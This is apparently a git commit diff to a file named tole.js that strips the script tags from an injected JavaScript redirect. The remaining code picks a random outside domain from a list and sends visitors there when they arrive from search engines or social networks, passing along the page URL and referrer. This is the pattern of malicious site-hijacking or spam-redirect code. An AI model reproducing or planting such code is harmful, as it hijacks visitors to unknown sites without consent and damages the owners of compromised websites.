1c84b301d2d372367e92a5c02b63641945997d7c
lookatdons <lookatdons@users.noreply.github.com>
2022-03-10 12:17:40 +0700

    Update tole.js

--- tole.js
+++ tole.js
@@ -1,4 +1,3 @@
-<script>
 var ars = rChoice([
 	'https://casaanitavip.com/',
 	'https://disfrutessen.com/',
@@ -16,4 +15,4 @@ function rChoice(arr) {
 
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'yahoo.', 'aol.', 'ask.', 'duckduckgo.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
   window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer)
-}</script>
+}
